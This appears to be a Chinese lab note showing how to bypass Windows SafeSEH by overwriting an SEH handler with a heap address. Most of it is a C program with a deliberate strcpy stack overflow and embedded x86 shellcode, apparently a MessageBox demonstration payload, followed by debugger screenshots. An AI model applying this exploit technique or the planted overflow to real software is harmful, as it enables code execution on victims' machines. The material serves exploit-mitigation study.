###   堆繞過非常簡單。


### 只需要把 SEH 的 handler 中的地址改成堆上的一個地址，就可以繞過Safe SEH 




```
//#include <stdafx.h>
#include <stdlib.h>
#include <string.h>

char shellcode[]=

/*
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
//292 bytes 

"BBBB"  //next
"CCCC"; //handler 
*/  



"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

"BBBB" //next

"\xb8\x28\x39\x00";  // 堆起始位址 



void test(char * input)
{
	
	char str[200];
	strcpy(str,input);
	__asm int 3 // 觀察 stack 上的 seh 
    int zero=0;
	zero=1/zero;
}

void main()
{
	char * buf=(char *)malloc(500);
	__asm int 3  // 觀察 eax 
	strcpy(buf,shellcode);
	test(shellcode);	
}

```


---
## 1  
![enter image description here](https://i.imgur.com/OTPgCSZ.png)

## 2
![enter image description here](https://i.imgur.com/TeACmJy.png)

## 3
![enter image description here](https://i.imgur.com/gGRHLRq.png)



###  4.成功
![enter image description here](https://i.imgur.com/NpsNEqq.png)
